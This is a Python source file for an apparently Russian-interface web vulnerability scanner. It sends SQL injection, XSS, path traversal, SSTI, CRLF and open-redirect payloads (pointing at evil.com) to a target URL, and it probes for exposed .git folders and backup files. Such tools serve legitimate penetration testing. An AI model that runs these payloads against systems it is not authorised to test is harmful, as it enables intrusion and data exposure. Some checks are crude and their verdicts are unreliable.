#!/usr/bin/env python3
"""
HunterA - Advanced Web Vulnerability Scanner v1.0
==================================================
Detects SQLi, XSS, LFI, Open Redirect, CRLF, SSTI, CMS, .git exposure,
backup files, CORS misconfig, and security headers.
Fully asynchronous, no root required.
"""

import asyncio
import aiohttp
import re
import zlib
import hashlib
import random
import string
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.prompt import Prompt, Confirm
from rich import box

console = Console()

# ── User-Agent rotation ───────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
]

# ── SQLi Payloads ─────────────────────────────────────────────
SQLI_PAYLOADS = {
    "error_based": [
        "'", "\"", "1'", "1\"", "1')", "1\")", "1'))", "1\"))",
        "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
        "1' AND 1=2--", "1\" AND 1=2--", "' UNION SELECT NULL--",
    ],
    "time_based": [
        "' OR SLEEP(2)--", "\" OR SLEEP(2)--", "1' AND SLEEP(2)--",
        "'; WAITFOR DELAY '00:00:02'--", "' OR pg_sleep(2)--",
    ],
    "boolean_based": [
        "' AND '1'='1", "' AND '1'='2", "\" AND \"1\"=\"1", "\" AND \"1\"=\"2",
        "1' AND '1'='1'--", "1' AND '1'='2'--",
    ],
}

# ── XSS Payloads ──────────────────────────────────────────────
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<IMG SRC=javascript:alert('XSS')>",
    "<DIV STYLE=\"width:expression(alert('XSS'))\">",
    "javascript:alert('XSS')",
    "<a href=\"javascript:alert('XSS')\">click</a>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    "<details/open/ontoggle=alert('XSS')>",
    "<select><style></select><img src=x onerror=alert('XSS')></style>",
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "#\"><script>alert('XSS')</script>",
    "#<img src=x onerror=alert('XSS')>",
]

# ── LFI Payloads ──────────────────────────────────────────────
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "/etc/passwd",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "....//....//....//....//windows/win.ini",
    "../../../../../../windows/win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
]

# ── Open Redirect Payloads ────────────────────────────────────
OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "https://evil.com%23.target.com",
    "https://evil.com.target.com",
    "https:evil.com",
    "////evil.com",
    "https://evil.com%40target.com",
    "https://target.com@evil.com",
    "%09https://evil.com",
    "https://evil.com%0d%0a",
    "java%0d%0ascript%0d%0a:alert(0)",
]

# ── CRLF Payloads ─────────────────────────────────────────────
CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:crlfinjection=test",
    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a",
    "%0d%0aLocation:https://evil.com",
    "%0d%0aX-Injected:true",
    "\\r\\nSet-Cookie:crlf=test",
    "%E5%98%8D%E5%98%8ASet-Cookie:crlf=test",
]

# ── SSTI Payloads ─────────────────────────────────────────────
SSTI_PAYLOADS = [
    "{{7*7}}",                     # Jinja2 / Twig
    "${7*7}",                      # Freemarker
    "#{7*7}",                      # Velocity
    "<%= 7*7 %>",                  # ERB
    "{{7*'7'}}",                   # Twig
    "${{7*7}}",                    # Smarty
    "{{config}}",                  # Flask/Jinja2
    "{{self}}",                    # Jinja2
    "{{''.__class__.__mro__}}",    # Jinja2 RCE chain
]

# ── CMS Signatures ────────────────────────────────────────────
CMS_SIGNATURES = {
    "WordPress": {
        "paths": ["/wp-login.php", "/wp-admin/", "/wp-content/", "/wp-includes/"],
        "headers": ["X-Powered-By: WordPress"],
        "meta": ['<meta name="generator" content="WordPress'],
        "version_regex": r'WordPress\s+(\d+\.\d+(?:\.\d+)?)',
    },
    "Joomla": {
        "paths": ["/administrator/", "/components/", "/modules/", "/templates/"],
        "headers": ["X-Content-Encoded-By: Joomla"],
        "meta": ['<meta name="generator" content="Joomla'],
        "version_regex": r'Joomla!\s+(\d+\.\d+(?:\.\d+)?)',
    },
    "Drupal": {
        "paths": ["/user/login", "/sites/default/", "/misc/drupal.js"],
        "headers": ["X-Generator: Drupal"],
        "meta": ['<meta name="Generator" content="Drupal'],
        "version_regex": r'Drupal\s+(\d+\.\d+(?:\.\d+)?)',
    },
    "Bitrix": {
        "paths": ["/bitrix/", "/bitrix/admin/", "/bitrix/js/"],
        "headers": ["X-Powered-CMS: Bitrix"],
        "meta": [],
        "version_regex": r'Bitrix\s+(\d+\.\d+(?:\.\d+)?)',
    },
    "Magento": {
        "paths": ["/magento/", "/skin/frontend/", "/media/catalog/"],
        "headers": ["X-Magento"],
        "meta": [],
        "version_regex": r'Magento\s+(\d+\.\d+(?:\.\d+)?)',
    },
    "PrestaShop": {
        "paths": ["/prestashop/", "/modules/", "/themes/"],
        "headers": ["Powered-By: PrestaShop"],
        "meta": [],
        "version_regex": r'PrestaShop\s+(\d+\.\d+(?:\.\d+)?)',
    },
    "OpenCart": {
        "paths": ["/admin/", "/catalog/", "/image/"],
        "headers": [],
        "meta": [],
        "version_regex": r'OpenCart\s+(\d+\.\d+(?:\.\d+)?)',
    },
    "TYPO3": {
        "paths": ["/typo3/", "/typo3conf/", "/typo3temp/"],
        "headers": ["X-Generator: TYPO3"],
        "meta": ['<meta name="generator" content="TYPO3'],
        "version_regex": r'TYPO3\s+(\d+\.\d+(?:\.\d+)?)',
    },
}

# ── Backup File Generator ─────────────────────────────────────
def generate_backup_paths(domain: str) -> List[str]:
    """Generate common backup file paths based on domain name."""
    base_name = domain.replace('www.', '').split('.')[0]
    variations = [
        base_name, base_name + "_backup", base_name + "_old", base_name + "_new",
        base_name + "_dev", base_name + "_staging", base_name + "_test",
        base_name + "_db", base_name + "_sql", base_name + "_dump",
        "backup", "backups", "old", "temp", "tmp", "test", "dev",
        "staging", "dump", "db", "database", "sql", "export",
        "site", "www", "web", "app", "src", "public_html", "htdocs",
    ]
    extensions = [".zip", ".tar.gz", ".tgz", ".tar", ".rar", ".7z", ".sql", ".gz", ".bz2",
                  ".bak", ".old", ".backup", ".swp", ".orig"]
    paths = []
    for name in variations:
        for ext in extensions:
            paths.append(f"{name}{ext}")
            paths.append(f"{name}_backup{ext}")
    return paths

# ── Async HTTP Client ─────────────────────────────────────────
async def fetch(session, url, method="GET", timeout=10, follow_redirects=False, headers=None):
    """Async HTTP request with error handling."""
    if headers is None:
        headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        async with session.request(method, url, timeout=aiohttp.ClientTimeout(total=timeout),
                                   allow_redirects=follow_redirects, headers=headers, ssl=False) as resp:
            text = await resp.text()
            return {"status": resp.status, "text": text, "url": str(resp.url), "headers": dict(resp.headers)}
    except:
        return None

# ── SQL Injection Scanner ─────────────────────────────────────
async def scan_sqli(session, url: str) -> List[Dict]:
    """Detect SQL injection vulnerabilities."""
    findings = []
    parsed = urlparse(url)
    if not parsed.query:
        return findings

    params = parse_qs(parsed.query)
    base_url = url.split('?')[0]

    for param_name in params:
        for category, payloads in SQLI_PAYLOADS.items():
            for payload in payloads[:5]:  # Limit per category
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload
                test_url = f"{base_url}?{urlencode(test_params)}"

                # Normal request (baseline)
                baseline = await fetch(session, test_url.replace(payload, params[param_name][0]))
                if not baseline:
                    continue

                # Attack request
                result = await fetch(session, test_url)
                if not result:
                    continue

                # Detection logic
                sql_errors = [
                    "SQL syntax", "mysql_fetch", "MySQL", "ORA-", "PostgreSQL",
                    "SQLite", "Microsoft SQL", "JDBC", "ODBC Driver",
                    "Unclosed quotation mark", "You have an error in your SQL syntax",
                    "Warning: mysql", "valid MySQL result", "PostgreSQL query",
                ]
                text_lower = result['text'].lower()

                # Error-based detection
                if category == "error_based":
                    for err in sql_errors:
                        if err.lower() in text_lower:
                            findings.append({
                                "type": "SQL Injection (Error-based)",
                                "param": param_name,
                                "payload": payload,
                                "evidence": err,
                                "severity": "CRITICAL",
                            })
                            break

                # Time-based detection
                if category == "time_based" and "sleep" in payload.lower():
                    # Approximate timing check (async limitation)
                    pass

                # Boolean-based detection
                if category == "boolean_based":
                    true_payload = payload.replace("'2", "'1").replace("\"2", "\"1")
                    if true_payload != payload:
                        true_result = await fetch(session, base_url + "?" + urlencode({param_name: true_payload}))
                        if true_result and true_result['status'] == 200:
                            if abs(len(result['text']) - len(true_result['text'])) > 200:
                                findings.append({
                                    "type": "SQL Injection (Boolean-based)",
                                    "param": param_name,
                                    "payload": payload,
                                    "evidence": f"Response size differs by {abs(len(result['text']) - len(true_result['text']))} bytes",
                                    "severity": "CRITICAL",
                                })

    return findings

# ── XSS Scanner ───────────────────────────────────────────────
async def scan_xss(session, url: str) -> List[Dict]:
    """Detect reflected XSS vulnerabilities."""
    findings = []
    parsed = urlparse(url)
    if not parsed.query:
        return findings

    params = parse_qs(parsed.query)
    base_url = url.split('?')[0]

    for param_name in params:
        for payload in XSS_PAYLOADS[:10]:  # Limit to 10 most effective
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param_name] = payload
            test_url = f"{base_url}?{urlencode(test_params)}"

            result = await fetch(session, test_url)
            if not result:
                continue

            # Check if payload is reflected in response
            if payload in result['text']:
                # Check if reflected in dangerous context
                dangerous_contexts = [
                    f'<script>{payload}</script>',
                    f'"{payload}"',
                    f"'{payload}'",
                    f'onerror="{payload}"',
                    f'onclick="{payload}"',
                ]
                is_dangerous = any(ctx in result['text'] for ctx in dangerous_contexts)
                findings.append({
                    "type": "XSS (Reflected)" + (" [DANGEROUS CONTEXT]" if is_dangerous else ""),
                    "param": param_name,
                    "payload": payload,
                    "evidence": "Payload reflected in response",
                    "severity": "HIGH" if is_dangerous else "MEDIUM",
                })
                break  # One finding per param

    return findings

# ── LFI / Path Traversal Scanner ──────────────────────────────
async def scan_lfi(session, url: str) -> List[Dict]:
    """Detect Local File Inclusion / Path Traversal."""
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query) if parsed.query else {}
    base_url = url.split('?')[0]

    lfi_indicators = ["root:", "daemon:", "bin:", "[extensions]", "<?php", "apache2"]

    # Test GET parameters
    for param_name in list(params.keys())[:3]:  # Limit to first 3 params
        for payload in LFI_PAYLOADS[:8]:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param_name] = payload
            test_url = f"{base_url}?{urlencode(test_params)}"
            result = await fetch(session, test_url)
            if result:
                text = result['text'][:500]
                for indicator in lfi_indicators:
                    if indicator.lower() in text.lower():
                        findings.append({
                            "type": "LFI / Path Traversal",
                            "param": param_name,
                            "payload": payload,
                            "evidence": f"Found '{indicator}' in response",
                            "severity": "HIGH",
                        })
                        break

    # Also test direct path injection in URL
    for payload in LFI_PAYLOADS[:5]:
        if base_url.count('/') > 2:
            test_url = base_url.rsplit('/', 1)[0] + '/' + payload
            result = await fetch(session, test_url)
            if result:
                for indicator in lfi_indicators:
                    if indicator.lower() in result['text'][:500].lower():
                        findings.append({
                            "type": "LFI / Path Traversal (Direct)",
                            "param": "URL Path",
                            "payload": payload,
                            "evidence": f"Found '{indicator}'",
                            "severity": "HIGH",
                        })
                        break

    return findings

# ── Open Redirect Scanner ─────────────────────────────────────
async def scan_open_redirect(session, url: str) -> List[Dict]:
    """Detect Open Redirect vulnerabilities."""
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query) if parsed.query else {}
    base_url = url.split('?')[0]

    redirect_params = ['redirect', 'url', 'next', 'return', 'goto', 'redir', 'returnTo', 'returnUrl', 'target']

    for param_name in params:
        if param_name.lower() not in redirect_params:
            continue
        for payload in OPEN_REDIRECT_PAYLOADS[:6]:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param_name] = payload
            test_url = f"{base_url}?{urlencode(test_params)}"
            result = await fetch(session, test_url, follow_redirects=False)
            if result and result['status'] in [301, 302, 303, 307, 308]:
                location = result['headers'].get('Location', '')
                if 'evil.com' in location or payload in location:
                    findings.append({
                        "type": "Open Redirect",
                        "param": param_name,
                        "payload": payload,
                        "evidence": f"Redirects to {location}",
                        "severity": "MEDIUM",
                    })
                    break

    return findings

# ── CRLF Injection Scanner ────────────────────────────────────
async def scan_crlf(session, url: str) -> List[Dict]:
    """Detect CRLF Injection vulnerabilities."""
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query) if parsed.query else {}
    base_url = url.split('?')[0]

    for param_name in list(params.keys())[:3]:
        for payload in CRLF_PAYLOADS[:5]:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param_name] = payload
            test_url = f"{base_url}?{urlencode(test_params)}"
            result = await fetch(session, test_url)
            if result:
                headers_str = str(result['headers']).lower()
                if 'crlf' in headers_str or 'x-injected' in headers_str:
                    findings.append({
                        "type": "CRLF Injection",
                        "param": param_name,
                        "payload": payload,
                        "evidence": "Header injected successfully",
                        "severity": "MEDIUM",
                    })
                    break

    return findings

# ── SSTI Scanner ──────────────────────────────────────────────
async def scan_ssti(session, url: str) -> List[Dict]:
    """Detect Server-Side Template Injection."""
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query) if parsed.query else {}
    base_url = url.split('?')[0]

    for param_name in list(params.keys())[:3]:
        for payload in SSTI_PAYLOADS[:8]:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param_name] = payload
            test_url = f"{base_url}?{urlencode(test_params)}"
            result = await fetch(session, test_url)
            if result:
                # Check for SSTI evaluation indicators
                if "49" in result['text']:  # 7*7 evaluated
                    findings.append({
                        "type": "SSTI",
                        "param": param_name,
                        "payload": payload,
                        "evidence": "Expression 7*7 evaluated to 49",
                        "severity": "CRITICAL",
                    })
                    break
                if "7777777" in result['text']:  # 7*'7' in Twig
                    findings.append({
                        "type": "SSTI (Twig)",
                        "param": param_name,
                        "payload": payload,
                        "evidence": "Expression 7*'7' evaluated to 7777777",
                        "severity": "CRITICAL",
                    })
                    break

    return findings

# ── CMS Detection ─────────────────────────────────────────────
async def detect_cms(session, base_url: str) -> List[Dict]:
    """Detect CMS and version."""
    findings = []
    for cms_name, signature in CMS_SIGNATURES.items():
        # Check paths
        for path in signature['paths'][:2]:
            check_url = urljoin(base_url, path)
            result = await fetch(session, check_url)
            if result and result['status'] in [200, 301, 302, 403]:
                findings.append({
                    "type": f"CMS Detected: {cms_name}",
                    "param": "N/A",
                    "payload": path,
                    "evidence": f"Found {path} with status {result['status']}",
                    "severity": "INFO",
                })
                break

        # Check meta tags
        if not findings or findings[-1]['type'] != f"CMS Detected: {cms_name}":
            result = await fetch(session, base_url)
            if result:
                for meta_pattern in signature['meta']:
                    if meta_pattern.lower() in result['text'].lower():
                        version_match = re.search(signature['version_regex'], result['text'], re.I)
                        findings.append({
                            "type": f"CMS Detected: {cms_name}" + (f" {version_match.group(1)}" if version_match else ""),
                            "param": "N/A",
                            "payload": "meta generator",
                            "evidence": f"Found meta generator tag for {cms_name}",
                            "severity": "INFO",
                        })
                        break

    return findings

# ── .git Exposure Scanner ─────────────────────────────────────
async def scan_git_exposure(session, base_url: str) -> List[Dict]:
    """Detect exposed .git directories."""
    findings = []
    git_files = [
        ".git/HEAD", ".git/config", ".git/index", ".git/description",
        ".git/logs/HEAD", ".git/refs/heads/master", ".git/objects/info/packs",
    ]
    for git_file in git_files:
        check_url = urljoin(base_url, git_file)
        result = await fetch(session, check_url)
        if result and result['status'] == 200:
            # Verify it's actually a git file
            if git_file == ".git/HEAD" and "ref:" in result['text']:
                findings.append({
                    "type": "Exposed .git Directory",
                    "param": "N/A",
                    "payload": git_file,
                    "evidence": ".git/HEAD confirms Git repository",
                    "severity": "HIGH",
                })
                break
            elif git_file == ".git/config" and "[core]" in result['text']:
                findings.append({
                    "type": "Exposed .git Directory",
                    "param": "N/A",
                    "payload": git_file,
                    "evidence": ".git/config accessible",
                    "severity": "HIGH",
                })
                break
    return findings

# ── Backup Files Scanner ──────────────────────────────────────
async def scan_backup_files(session, base_url: str, domain: str) -> List[Dict]:
    """Scan for exposed backup files."""
    findings = []
    paths = generate_backup_paths(domain)
    for path in paths[:30]:  # Limit to 30 most likely
        check_url = urljoin(base_url, path)
        result = await fetch(session, check_url)
        if result and result['status'] == 200 and result['text']:
            # Check if it looks like a real backup
            size = len(result['text'])
            if size > 1000:
                findings.append({
                    "type": "Backup File Exposed",
                    "param": "N/A",
                    "payload": path,
                    "evidence": f"Backup file found ({size} bytes)",
                    "severity": "CRITICAL",
                })
                break  # One finding is enough
    return findings

# ── Security Headers Check ────────────────────────────────────
async def check_security_headers(session, url: str) -> List[Dict]:
    """Check for missing security headers."""
    findings = []
    result = await fetch(session, url)
    if not result:
        return findings

    headers = result['headers']
    required_headers = {
        "Strict-Transport-Security": "HSTS not enabled",
        "X-Frame-Options": "Clickjacking protection missing",
        "X-Content-Type-Options": "MIME sniffing prevention missing",
        "Content-Security-Policy": "CSP not configured",
        "Referrer-Policy": "Referrer policy not set",
        "Permissions-Policy": "Feature policy not configured",
    }

    for header, description in required_headers.items():
        if header not in headers:
            findings.append({
                "type": "Missing Security Header",
                "param": header,
                "payload": "N/A",
                "evidence": description,
                "severity": "LOW",
            })

    # CORS check
    if "Access-Control-Allow-Origin" in headers:
        acao = headers["Access-Control-Allow-Origin"]
        if acao == "*" or "null" in acao:
            findings.append({
                "type": "CORS Misconfiguration",
                "param": "Access-Control-Allow-Origin",
                "payload": acao,
                "evidence": f"ACAO set to '{acao}'",
                "severity": "MEDIUM",
            })

    return findings

# ── Display Functions ─────────────────────────────────────────
def display_findings(all_findings: List[Dict], url: str):
    """Display all findings in a structured table."""
    if not all_findings:
        console.print(Panel("[green]✓ Уязвимостей не обнаружено[/green]", border_style="green"))
        return

    # Group by severity
    critical = [f for f in all_findings if f.get('severity') == 'CRITICAL']
    high = [f for f in all_findings if f.get('severity') == 'HIGH']
    medium = [f for f in all_findings if f.get('severity') == 'MEDIUM']
    low = [f for f in all_findings if f.get('severity') in ('LOW', 'INFO')]

    console.print(Panel(
        f"[bold]URL:[/] {url}\n"
        f"[red]CRITICAL: {len(critical)}[/] | [yellow]HIGH: {len(high)}[/] | [cyan]MEDIUM: {len(medium)}[/] | [dim]INFO/LOW: {len(low)}[/]",
        title="Scan Results", border_style="red"
    ))

    for severity_level, findings_list, color in [
        ("CRITICAL", critical, "red"),
        ("HIGH", high, "yellow"),
        ("MEDIUM", medium, "cyan"),
        ("LOW/INFO", low, "dim"),
    ]:
        if not findings_list:
            continue
        table = Table(title=f"[{color}]{severity_level}[/{color}]", box=box.ROUNDED, border_style=color)
        table.add_column("Vulnerability", style=color)
        table.add_column("Parameter", style="white")
        table.add_column("Payload", style="dim")
        table.add_column("Evidence", style="white", max_width=40)
        for f in findings_list:
            table.add_row(
                f['type'],
                f.get('param', 'N/A'),
                f.get('payload', 'N/A')[:40],
                f.get('evidence', '')[:50],
            )
        console.print(table)

# ── Main Menu ─────────────────────────────────────────────────
async def web_vuln_menu_async():
    console.print(Panel("[bold red]СКАНЕР ВЕБ-УЯЗВИМОСТЕЙ (BLADE v1.0)[/bold red]",
                        border_style="red", box=box.HEAVY))
    console.print("[dim]SQLi | XSS | LFI | SSTI | Open Redirect | CRLF | CMS | .git | Backup | Security Headers[/dim]")

    url = Prompt.ask("Введите URL для сканирования")
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    console.print("\n[bold]Выберите типы проверок:[/bold]")
    console.print("[1] ВСЕ проверки (рекомендуется)")
    console.print("[2] Только инъекции (SQLi, XSS, LFI, SSTI)")
    console.print("[3] Только серверные (Open Redirect, CRLF, Headers)")
    console.print("[4] Только разведка (CMS, .git, Backup)")
    console.print("[5] Выбрать категории вручную")
    console.print("[0] Назад")

    choice = Prompt.ask("Ваш выбор", choices=["0","1","2","3","4","5"])

    if choice == "0":
        return

    # Determine which scans to run
    run_sqli = run_xss = run_lfi = run_open_redirect = run_crlf = run_ssti = run_cms = run_git = run_backup = run_headers = False

    if choice == "1":
        run_sqli = run_xss = run_lfi = run_open_redirect = run_crlf = run_ssti = run_cms = run_git = run_backup = run_headers = True
    elif choice == "2":
        run_sqli = run_xss = run_lfi = run_ssti = True
    elif choice == "3":
        run_open_redirect = run_crlf = run_headers = True
    elif choice == "4":
        run_cms = run_git = run_backup = True
    elif choice == "5":
        run_sqli = Confirm.ask("SQL-инъекции?", default=True)
        run_xss = Confirm.ask("XSS?", default=True)
        run_lfi = Confirm.ask("LFI / Path Traversal?", default=True)
        run_ssti = Confirm.ask("SSTI?", default=True)
        run_open_redirect = Confirm.ask("Open Redirect?", default=True)
        run_crlf = Confirm.ask("CRLF Injection?", default=True)
        run_cms = Confirm.ask("CMS Detection?", default=True)
        run_git = Confirm.ask(".git Exposure?", default=True)
        run_backup = Confirm.ask("Backup Files?", default=True)
        run_headers = Confirm.ask("Security Headers?", default=True)

    all_findings = []

    async with aiohttp.ClientSession() as session:
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=console
        ) as progress:
            total_tasks = sum([run_sqli, run_xss, run_lfi, run_ssti, run_open_redirect,
                              run_crlf, run_cms, run_git, run_backup, run_headers])
            task = progress.add_task("[cyan]Сканирование уязвимостей...", total=total_tasks)

            if run_sqli:
                progress.update(task, description="[cyan]SQL Injection...")
                findings = await scan_sqli(session, url)
                all_findings.extend(findings)
                progress.update(task, advance=1)

            if run_xss:
                progress.update(task, description="[cyan]XSS...")
                findings = await scan_xss(session, url)
                all_findings.extend(findings)
                progress.update(task, advance=1)

            if run_lfi:
                progress.update(task, description="[cyan]LFI...")
                findings = await scan_lfi(session, url)
                all_findings.extend(findings)
                progress.update(task, advance=1)

            if run_ssti:
                progress.update(task, description="[cyan]SSTI...")
                findings = await scan_ssti(session, url)
                all_findings.extend(findings)
                progress.update(task, advance=1)

            if run_open_redirect:
                progress.update(task, description="[cyan]Open Redirect...")
                findings = await scan_open_redirect(session, url)
                all_findings.extend(findings)
                progress.update(task, advance=1)

            if run_crlf:
                progress.update(task, description="[cyan]CRLF Injection...")
                findings = await scan_crlf(session, url)
                all_findings.extend(findings)
                progress.update(task, advance=1)

            if run_cms:
                progress.update(task, description="[cyan]CMS Detection...")
                findings = await detect_cms(session, url)
                all_findings.extend(findings)
                progress.update(task, advance=1)

            if run_git:
                progress.update(task, description="[cyan].git Exposure...")
                findings = await scan_git_exposure(session, url)
                all_findings.extend(findings)
                progress.update(task, advance=1)

            if run_backup:
                progress.update(task, description="[cyan]Backup Files...")
                domain = urlparse(url).netloc
                findings = await scan_backup_files(session, url, domain)
                all_findings.extend(findings)
                progress.update(task, advance=1)

            if run_headers:
                progress.update(task, description="[cyan]Security Headers...")
                findings = await check_security_headers(session, url)
                all_findings.extend(findings)
                progress.update(task, advance=1)

    display_findings(all_findings, url)
    console.input("\n[dim]Нажмите Enter для возврата...[/dim]")

def web_vuln_menu():
    """Синхронная обёртка для вызова из главного меню."""
    asyncio.run(web_vuln_menu_async())
